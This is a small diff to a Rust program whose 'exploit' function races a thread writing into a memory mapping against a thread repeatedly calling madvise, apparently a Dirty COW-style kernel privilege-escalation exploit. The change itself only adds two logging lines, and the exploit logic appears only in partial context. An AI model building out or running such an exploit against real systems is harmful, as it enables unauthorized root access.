@@ -36,6 +36,7 @@ fn exploit(infile: File, outfile: File) {
     let join_one = spawn_thread_to_write_new_data(infile, mapping);
     let join_two = spawn_thread_to_call_madvise(mapping as usize);
 
+    println!("Waiting for threads to finish");
     join_one.join().expect("Failed to join first thread");
     join_two.join().expect("Failed to join second thread");
 }
@@ -88,6 +89,8 @@ fn spawn_thread_to_call_madvise(mapping: usize) -> JoinHandle<()> {
                 );
             }
         }
+
+        println!("Finished spamming advise calls");
     });
 }
 
